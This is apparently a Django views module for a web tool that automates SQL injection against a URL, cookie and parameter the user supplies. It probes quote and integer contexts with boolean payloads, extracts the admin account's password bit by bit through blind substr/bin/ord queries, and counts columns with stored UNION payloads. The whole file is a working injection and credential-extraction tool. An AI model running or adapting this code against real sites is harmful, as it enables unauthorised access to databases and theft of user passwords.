import json
from .models import list
from ast import literal_eval
from django.shortcuts import render
from django.contrib import messages
from .utils import findUserKeyword, sendQuery


def checkAttackAble(dicQuery):
    attack_querys = '\n'
    for i in range(1, 3):
        res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f"' and 1={i}-- "})
        result = findUserKeyword(res, dicQuery['find'])

        if result[0] == 1:
            attack_querys += result[1] + '\n'
            start = "'"
            print(1, attack_querys, start)
            return 1, attack_querys, start

        else:
            res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f"' or 1={i}-- "})
            result = findUserKeyword(res, dicQuery['find'])
            print(result)

            if result[0] == 1:
                attack_querys += result[1] + '\n'
                start = "'"
                print(2, attack_querys, start)
                return 1, attack_querys, start

    for i in range(1, 3):
        res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f'" and 1={i}-- '})
        result = findUserKeyword(res, dicQuery['find'])

        if result[0] == 1:
            attack_querys += result[1] + '\n'
            start = '"'
            print(3, attack_querys, start)
            return 2, attack_querys, start
        else:
            res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f'" or 1={i}-- '})
            result = findUserKeyword(res, dicQuery['find'])

            if result[0] == 1:
                attack_querys += result[1] + '\n'
                flag = 1
                start = '"'
                print(4, attack_querys, start)
                return 2, attack_querys, start

    for i in range(1, 3):
        res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f' and 1={i}-- '})
        result = findUserKeyword(res, dicQuery['find'])

        if result[0] == 1:
            attack_querys += result[1] + '\n'
            start = str(dicQuery['parameter'])
            print(5, attack_querys, start)
            return 3, attack_querys, start
        else:
            res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f' or 1={i}-- '})
            result = findUserKeyword(res, dicQuery['find'])

        if result[0] == 1:
            attack_querys += result[1] + '\n'
            start = str(dicQuery['parameter'])
            print(6, attack_querys, start)
            return 3, attack_querys, start

    return -1, '', ''


def exploit2 (dicQuery, query):
    attack_querys =''
    res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + str(query)})
    result = findUserKeyword(res,dicQuery['find'])

    attack_querys += result[1]

    return result[0],attack_querys


def retry(request):
    flag = 0
    if(request.method == "POST"):
        query = (request.POST.get("requery"))
        dicQuery = request.POST.get("origin")
        python_dict = literal_eval(dicQuery)
        check_union ={'union', 'select'}

        for i in check_union:
            if i in query :
                obj, is_created = list.objects.get_or_create(query=query,stand='union')
                break

        else : obj, is_created = list.objects.get_or_create(query=query)


        a,testtest = exploit2(python_dict, obj)
        if(a == 1) :
            return render(request,'injection/result.html', {'ttt':testtest,'s':'1'})
        else :
            return render(request, 'injection/result.html', {'ttt': testtest, 'f': '1'})


def brute(start,dicQuery,attack_querys):
    length = 0
    getvalue = []
    for i in range(1, 51):
        res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + str(start) + f" or id='admin' and length(" + dicQuery['name'] + f")={i}-- "})
        result = findUserKeyword(res, dicQuery['find'])
        print(result)
        if result[0] == 1:
            attack_querys += result[1] + '\n'
            length = i
            break
    if length != 0:
        for i in range(1, length + 1):
            for j in range(1, 9):
                res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + str(start) + " or id='admin' and length(substr(" + dicQuery['name'] + f",{i},1))={j}-- "})
                result = findUserKeyword(res, dicQuery['find'])
                print(result)
                if result[0] == 1:
                    attack_querys += result[1] + '\n'
                    getvalue.append(j)
                    break

        pw_result = ''
        a = []
        print('length', length)
        print(getvalue)

        for j in range(1, length + 1):
            pw = ''
            bit = 8 * getvalue[j - 1]
            for i in range(1, bit + 1):
                res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + str(start) + " or id='admin' and substr(lpad(bin(ord(substr(" + dicQuery['name'] + f",{j},1))),{bit},0),{i},1)=1-- "})
                result = findUserKeyword(res, dicQuery['find'])
                attack_querys += result[1] + '\n'
                try:
                    if result[0] == 1:
                        pw += '1'
                    else:
                        pw += '0'
                except:
                    import traceback
                    print(traceback.format_exc())

                print(pw)
            a.append(pw)
            pw_result += chr(int(pw, 2))
            print("pw: %s" % (pw_result))


        return pw_result,attack_querys
    else :
        return '', attack_querys



def db_union(dicQuery):
    db_union = list.objects.filter(stand='union')
    db_len = list.objects.filter(stand='length')

    print(db_union)
    for i in db_union:
        res = sendQuery(dicQuery, {dicQuery['name']: i})
        result = findUserKeyword(res,dicQuery['find'])
        if result[0] == 1 :
            cnt = 1
            while 1 :
                print('cnt',cnt)
                search = str(cnt)
                if search in str(i):
                    cnt += 1
                else :
                    return cnt - 1

    return ''



        




def index(request):
    return render(request, 'injection/index.html', {})


def main(request):
    user_query = {'url': '',  'cookie': '', 'name': '', 'method': '', 'parameter': '', 'find': ''}


    if request.method == 'POST':
        url = request.POST.get("url", False)
        cookie = request.POST.get("cookie", False)
        find = request.POST.get("find", False)
        name = request.POST.get("name", False)
        method = request.POST.get("method", False)
        parameter = request.POST.get("parameter", False)
        range = request.POST.get("slider",False)

        print(range)


        user_query['url'] = url
        user_query['cookie'] = cookie
        user_query['find'] = find
        user_query['name'] = name
        user_query['method'] = method
        user_query['parameter'] = parameter

        a, value, start = checkAttackAble(user_query)
        print('start',start)
        print('a', a)
        print('value', value)
        if a != -1 :
            pw, value = brute(start, user_query, value)

        column_cnt = db_union(user_query)

        # b,url = union(url, cookie, find, name, method, parameter, result,flag,start)

        List = list.objects.order_by()

        if (a >= -1):
            if (a == 1):
                return render(request, 'injection/result.html',
                              {'data': value, 'double': '1', 'origin': str(user_query), 'list': List, 'pw' : pw,'column_cnt':column_cnt})
            elif (a == 2):
                return render(request, 'injection/result.html',
                              {'data': value, 'single': '1', 'origin': str(user_query), 'list': List, 'pw' : pw,'column_cnt':column_cnt})
            elif (a == 3):
                return render(request, 'injection/result.html',
                              {'data': value, 'integer': '1', 'origin': str(user_query), 'list': List, 'pw' : pw,'column_cnt':column_cnt})

    else:
        return render(request, 'injection/index.html', {})

    return 1
